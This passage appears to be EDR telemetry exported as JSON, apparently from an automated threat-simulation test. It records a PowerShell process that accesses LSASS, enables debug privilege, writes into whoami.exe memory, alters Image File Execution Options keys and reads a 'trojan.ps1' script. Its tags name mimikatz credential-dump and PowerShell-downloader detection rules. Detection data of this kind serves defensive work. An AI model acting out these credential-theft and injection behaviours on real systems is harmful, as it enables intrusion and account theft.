{
    "detections": [
        {
            "id": "1513138",
            "traceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "firstDetected": "2024-08-01T15:56:29Z",
            "severity": "s4",
            "rank": 280,
            "tags": [
                "@ATA.Collection",
                "@ATA.CommandAndControl",
                "@ATA.CredentialAccess",
                "@ATA.DefenseEvasion",
                "@ATA.Discovery",
                "@ATA.Execution",
                "@ATA.LateralMovement",
                "@ATA.Persistence",
                "@ATA.PrivilegeEscalation",
                "@ATE.T1003",
                "@ATE.T1003.001",
                "@ATE.T1003.002",
                "@ATE.T1003.003",
                "@ATE.T1003.004",
                "@ATE.T1003.005",
                "@ATE.T1003.006",
                "@ATE.T1003.007",
                "@ATE.T1003.008",
                "@ATE.T1016",
                "@ATE.T1021.006",
                "@ATE.T1027",
                "@ATE.T1033",
                "@ATE.T1047",
                "@ATE.T1053.005",
                "@ATE.T1057",
                "@ATE.T1059.001",
                "@ATE.T1068",
                "@ATE.T1069.001",
                "@ATE.T1071",
                "@ATE.T1074.001",
                "@ATE.T1082",
                "@ATE.T1087.001",
                "@ATE.T1102",
                "@ATE.T1102.003",
                "@ATE.T1105",
                "@ATE.T1106",
                "@ATE.T1112",
                "@ATE.T1134",
                "@ATE.T1134.001",
                "@ATE.T1134.002",
                "@ATE.T1134.003",
                "@ATE.T1140",
                "@ATE.T1546.012",
                "@ATE.T1550.002",
                "@ATE.T1550.003",
                "@ATE.T1552.001",
                "@ATE.T1552.002",
                "@ATE.T1552.004",
                "@ATE.T1552.006",
                "@ATE.T1555.003",
                "@ATE.T1555.004",
                "@ATE.T1558.001",
                "@ATE.T1558.002",
                "@MSI._api_tokenprivileges_lsass",
                "@MSI._apt_process_PS_Get_userinfo",
                "@MSI._apt_process_PS_env_systeminfo",
                "@MSI._apt_process_PS_win32_systeminfo",
                "@MSI._apt_process_gwmi",
                "@MSI._apt_process_whoami_high",
                "@MSI._apt_process_whoami_high_via_powershell",
                "@MSI._malware_powershell_downloader_low",
                "@MSI._malware_scripting_lsass_memory_read",
                "@MSI._process_PS_public_repos",
                "@MSI._process_accessed_lsass_high_0x1010",
                "@MSI._process_creds_edge",
                "@MSI._process_local_data_staging",
                "@MSI._process_mimikatz_creddump",
                "@MSI._process_powershell_download_public_repo_pscript",
                "@MSI._process_ps_get_process",
                "@MSI._process_ps_invoke_mimikatz",
                "@MSI._process_ps_invoke_mimikatz_script",
                "@MSI._process_psdownload",
                "@MSI._process_psexecexpression",
                "@MSI._process_psobfuscation",
                "@MSI._process_psobfuscation_character_tick",
                "@MSI._process_psobfuscation_frombase64",
                "@MSI._process_remote_invoke_command",
                "@MSI._process_schtasks_mimikatz_creddump_via_powershell",
                "@MSI._ps_redteam_accesscontrol_nishang",
                "@MSI._ps_redteam_credaccess_nishang",
                "@MSI._reg_ep0130_imageexecution_high"
            ],
            "host": {
                "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
                "hostname": "479W1022H264",
                "os": {
                    "major": 10,
                    "minor": 0,
                    "build": 19045,
                    "sp": "",
                    "desc": "Windows 10"
                },
                "lastBootTime": "2024-08-02T04:11:13Z",
                "epoTags": [
                    "Workstation"
                ],
                "netInterfaces": [
                    {
                        "macAddress": "00:50:56:A4:1D:84",
                        "ip": "10.26.23.233"
                    },
                    {
                        "name": "Primary",
                        "ip": ""
                    }
                ],
                "traceExtendedVisibility": 0,
                "hostOs": "windows"
            },
            "sha256": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3"
        }
    ],
    "traces": [
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Network Accessed",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "network": {
                "accessType": "connection_opened",
                "direction": "outbound",
                "dnsNames": [
                    "proxy.ess.gslb.entsec.com",
                    "us-lvs-essmwg1.corp.entsec.com"
                ],
                "dstIp": "10.194.0.190",
                "dstPort": 9090,
                "protocol": "tcp",
                "srcIp": "10.26.23.233",
                "srcPort": 53377
            },
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.NetworkConnection"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:09.467Z",
            "traceId": "31d9fdea-16c9-49c5-92a9-8ad44eda7f84",
            "uniqueRuleId": 19101,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "api": {
                "arguments": [
                    "0x86",
                    "0x0",
                    "0x7ffa00000000"
                ],
                "moduleName": "",
                "name": "BCryptEncrypt",
                "result": "0",
                "targetPid": 9936,
                "targetProcessFull": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Api",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.APICall"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:09.494Z",
            "traceId": "e9cbbc24-9228-459b-9b73-f4c2e0e6c8ad",
            "uniqueRuleId": 19117,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "RegValue Modified",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "registry": {
                "keyName": "HKLM\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\IMAGE FILE EXECUTION OPTIONS",
                "keyOldValue": "483457",
                "keyValue": "288705",
                "keyValueName": "BREAKONDLLLOAD",
                "keyValueType": "REG_DWORD"
            },
            "ruleTags": [
                "aseps"
            ],
            "rv": 4528,
            "tags": [
                "@AC.ASEPCreatedOrModified"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:09.419Z",
            "traceId": "8f287a04-60b5-4832-9b09-0c0594288c02",
            "uniqueRuleId": 8,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "api": {
                "arguments": [],
                "data": "Qzpc",
                "moduleName": "",
                "name": "GetDriveType",
                "result": "3",
                "targetPid": 0
            },
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Api",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.APICall"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:02.087Z",
            "traceId": "ea9b50e9-e9f6-49cb-b478-822827230250",
            "uniqueRuleId": 19120,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "api": {
                "arguments": [
                    "0x97c"
                ],
                "moduleName": "",
                "name": "ResumeThread",
                "result": "1",
                "targetPid": 9212,
                "targetProcessFull": "C:\\Windows\\System32\\whoami.exe"
            },
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Api",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.APICall"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:09.849Z",
            "traceId": "0cd6f214-74c3-4896-92cc-7f90b88ea4b7",
            "uniqueRuleId": 19115,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "api": {
                "arguments": [
                    "0xe799a7f2d8",
                    "0x8",
                    "0x0"
                ],
                "data": "AACQ3D4CAAA=",
                "moduleName": "",
                "name": "WriteProcessMemory",
                "result": "0",
                "targetPid": 9212,
                "targetProcessFull": "C:\\Windows\\System32\\whoami.exe"
            },
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Api",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.APICall"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:09.849Z",
            "traceId": "8e391088-cd33-4d4b-ab36-5311cf116f94",
            "uniqueRuleId": 11,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "api": {
                "arguments": [
                    "0x4",
                    "0x2"
                ],
                "moduleName": "",
                "name": "NtDuplicateToken",
                "result": "0",
                "targetPid": 9936,
                "targetProcessFull": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Api",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.APICall"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.931Z",
            "traceId": "bb518749-e37b-4849-8ebc-e347e70e80d8",
            "uniqueRuleId": 19120,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Image Loaded",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "modules": [
                {
                    "fsattrs": 32,
                    "loadTime": "2024-08-01T15:54:15.516Z",
                    "name": "C:\\Windows\\System32\\netapi32.dll",
                    "sha256": "29A7485F79FB695C0F87FCFA170EAC497899916D337213BE20DC6A0652B8DCF2",
                    "vtpPrivileges": 1
                }
            ],
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.LoadedDLLs"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:15.516Z",
            "traceId": "105d89c2-ab98-4d5f-9129-0ba69742d7ec",
            "uniqueRuleId": 18,
            "version": "3.0"
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "File Read",
            "fileAttributes": {
                "creationDate": "2022-05-11T18:51:56.000Z",
                "fsattrs": 32,
                "lastModificationDate": "2022-05-11T18:51:56.000Z",
                "md5": "0581DE6B7F79A9656788B027BBC6D3C1",
                "mhdr": "2472616e646f6d20",
                "name": "trojan.ps1",
                "path": "C:\\Users\\cdaauto\\Desktop\\threatfiles\\threatfiles\\trojan.ps1",
                "sha1": "C461A83B637842A9F6E9FEBF8A870D39C4C1C55A",
                "sha256": "67F3D0692277A433D1524E5BEA36753C5DF00B7F4FD001FD92C2C4EAB86049B3",
                "size": 1363
            },
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.ScriptCreated"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:04.374Z",
            "traceId": "afa34c8a-5539-4a41-9f85-20be71cbeaba",
            "uniqueRuleId": 5,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "api": {
                "arguments": [
                    "0xe4",
                    "0x0"
                ],
                "data": "U2VEZWJ1Z1ByaXZpbGVnZToyOw==",
                "moduleName": "",
                "name": "AdjustTokenPrivileges",
                "result": "1",
                "targetPid": 9936,
                "targetProcessFull": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Api",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.APICall"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.931Z",
            "traceId": "491c24e3-61d7-44d4-8a4b-4079503ca1e0",
            "uniqueRuleId": 19120,
            "version": "3.0",
            "severity": "s1",
            "detectionsSets": [
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.DefenseEvasion",
                        "@ATA.PrivilegeEscalation",
                        "@ATA.Execution",
                        "@ATA.CredentialAccess",
                        "@ATE.T1134",
                        "@ATE.T1106",
                        "@ATE.T1003.001",
                        "@MSI._api_tokenprivileges_lsass"
                    ]
                }
            ],
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "File Deleted",
            "fileAttributes": {
                "creationDate": "2024-08-01T15:54:01.962Z",
                "fsattrs": 32,
                "lastModificationDate": "2024-08-01T15:54:01.962Z",
                "md5": "D17FE0A3F47BE24A6453E9EF58C94641",
                "name": "__PSScriptPolicyTest_chhddsaq.phl.psm1",
                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\__PSScriptPolicyTest_chhddsaq.phl.psm1",
                "sha1": "6AB83620379FC69F80C0242105DDFFD7D98D5D9D",
                "sha256": "96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7",
                "size": 60
            },
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.NonPECreated"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.999Z",
            "traceId": "3362be6a-b300-4ea0-bb64-39d1d690317a",
            "uniqueRuleId": 6,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "api": {
                "arguments": [
                    "0x0"
                ],
                "data": "Uk5HfA==",
                "moduleName": "",
                "name": "BCryptOpenAlgorithmProvider",
                "result": "0",
                "targetPid": 9936,
                "targetProcessFull": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
            },
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Api",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.APICall"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.853Z",
            "traceId": "60a038f2-2d13-41a4-a2a7-f78a5e354973",
            "uniqueRuleId": 19117,
            "version": "3.0",
            "severity": "s1",
            "detectionsSets": [
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.DefenseEvasion",
                        "@ATA.PrivilegeEscalation",
                        "@ATA.Execution",
                        "@ATA.CredentialAccess",
                        "@ATE.T1134",
                        "@ATE.T1106",
                        "@ATE.T1003.001",
                        "@MSI._api_tokenprivileges_lsass"
                    ]
                }
            ],
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "File Created",
            "fileAttributes": {
                "creationDate": "2024-08-01T15:54:01.962Z",
                "fsattrs": 32,
                "lastModificationDate": "2024-08-01T15:54:01.962Z",
                "md5": "D17FE0A3F47BE24A6453E9EF58C94641",
                "mhdr": "2320506f77657253",
                "name": "__PSScriptPolicyTest_chhddsaq.phl.psm1",
                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\__PSScriptPolicyTest_chhddsaq.phl.psm1",
                "sha1": "6AB83620379FC69F80C0242105DDFFD7D98D5D9D",
                "sha256": "96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7",
                "size": 60
            },
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.NonPECreated"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.973Z",
            "traceId": "9e7f445d-764d-41c7-b860-8cb64954d4d3",
            "uniqueRuleId": 1,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "accessType": 4112,
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Process Accessed",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "relatedProcess": {
                "cmdLine": "C:\\Windows\\system32\\lsass.exe",
                "integrity": 4,
                "pid": 680,
                "procFileAttrs": {
                    "embedFilename": "lsass.exe",
                    "fileType": "PE",
                    "md5": "60E18F7B8D1F43731D0E9169C2D16547",
                    "name": "lsass.exe",
                    "path": "C:\\Windows\\System32\\lsass.exe",
                    "reputation": {
                        "reputation": 99,
                        "vtpPrivileges": 1
                    },
                    "sha1": "83EBB66F070956225959EE773B468F89ED55479C",
                    "sha256": "EFA9E8325232BBD3F9A118D396DE04370E56C3C7B6D552FAB46B5B39F3AD522D",
                    "size": 60640,
                    "subsystem": 2
                },
                "processName": "lsass.exe",
                "user": {
                    "domain": "NT AUTHORITY",
                    "id": "S-1-5-18",
                    "name": "NT AUTHORITY\\SYSTEM"
                }
            },
            "rv": 4528,
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:16.042Z",
            "traceId": "bacda3a7-ad96-4cc1-b5d8-90f9d1a11669",
            "uniqueRuleId": 25,
            "version": "3.0",
            "severity": "s1",
            "detectionsSets": [
                {
                    "sev": "s1",
                    "tags": [
                        "@ATA.Execution",
                        "@ATA.CredentialAccess",
                        "@ATE.T1003",
                        "@MSI._process_accessed_lsass_high_0x1010"
                    ]
                }
            ]
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "RegValue Modified",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "registry": {
                "keyName": "HKCU\\SOFTWARE\\MICROSOFT\\WINDOWS NT\\CURRENTVERSION\\IMAGE FILE EXECUTION OPTIONS",
                "keyOldValue": "483457",
                "keyValue": "288705",
                "keyValueName": "DEBUGGER",
                "keyValueType": "REG_DWORD"
            },
            "ruleTags": [
                "aseps"
            ],
            "rv": 4528,
            "tags": [
                "@AC.ASEPCreatedOrModified"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:04.404Z",
            "traceId": "f48b6c43-6220-4ec4-a50e-7502a61b1c2d",
            "uniqueRuleId": 8,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "File Created",
            "fileAttributes": {
                "creationDate": "2024-08-01T15:54:01.962Z",
                "fsattrs": 32,
                "lastModificationDate": "2024-08-01T15:54:01.962Z",
                "md5": "D17FE0A3F47BE24A6453E9EF58C94641",
                "mhdr": "2320506f77657253",
                "name": "__PSScriptPolicyTest_fift2gbs.szm.ps1",
                "path": "C:\\Users\\cdaauto\\AppData\\Local\\Temp\\__PSScriptPolicyTest_fift2gbs.szm.ps1",
                "sha1": "6AB83620379FC69F80C0242105DDFFD7D98D5D9D",
                "sha256": "96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7",
                "size": 60
            },
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.ScriptCreated"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:01.971Z",
            "traceId": "20ebebbd-ac9a-4264-b774-7be630e8a967",
            "uniqueRuleId": 1,
            "version": "3.0",
            "action": "",
            "productId": "",
            "description": ""
        },
        {
            "contextTraceId": "23500fac-64fd-41c3-a384-08c6073f1290",
            "detectionDate": "2024-08-01T15:54:28Z",
            "dtsId": "EDR",
            "dtsType": "all",
            "eventType": "Image Loaded",
            "h_os": "windows",
            "h_tp": "mar_4.2.1.4528",
            "h_traceType": "all",
            "h_version": "3.0",
            "host": "479W1022H264",
            "it": 1,
            "maGuid": "EB44566A-4F0B-11EF-370F-005056A41D84",
            "modules": [
                {
                    "fsattrs": 32,
                    "loadTime": "2024-08-01T15:54:09.428Z",
                    "name": "C:\\Windows\\System32\\rasapi32.dll",
                    "sha256": "4BEF55B77569B181E5D977C208C29B5A08E11DD47D59409538ED54A493225E3A",
                    "vtpPrivileges": 1
                },
                {
                    "fsattrs": 32,
                    "loadTime": "2024-08-01T15:54:09.490Z",
                    "name": "C:\\Windows\\System32\\ncrypt.dll",
                    "sha256": "DABB5B5A32CF17E4D70C4F8E420DE0443086E5F25E6B23354CD2B9719FEE1001",
                    "vtpPrivileges": 1
                }
            ],
            "pFullName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
            "pSha2": "9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3",
            "parentTraceId": "5376d470-026b-4f4e-8199-e764dbd64451",
            "pid": 9936,
            "ppid": 9936,
            "rv": 4528,
            "tags": [
                "@AC.LoadedDLLs"
            ],
            "tenantId": "1E23A611-B47C-463A-A66E-B46D27E46001",
            "time": "2024-08-01T15:54:09.428Z",
            "traceId": "0564416e-c565-4ed2-8758-c02e45aa7c18",
            "uniqueRuleId": 18,
            "version": "3.0"
        },
        {
            "api": {
                "arguments": [],
                "moduleName": "",
